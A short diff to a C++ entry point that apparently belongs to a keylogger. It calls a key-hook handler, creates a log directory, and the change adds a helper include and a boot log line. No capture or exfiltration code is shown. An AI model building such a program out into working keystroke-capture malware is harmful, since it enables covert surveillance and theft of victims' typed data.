@@ -1,5 +1,6 @@
 #include "stream.h"
 #include "keyhook.h"
+#include "helper.h"
 
 int main() {
   stream::MakeDir(stream::GetPath());
@@ -7,5 +8,6 @@ int main() {
 
   key_hook::HandleMessage(true);
 
+  stream::WriteLog("[*] BOOT [*]", 0x0);
   return 0;
 }
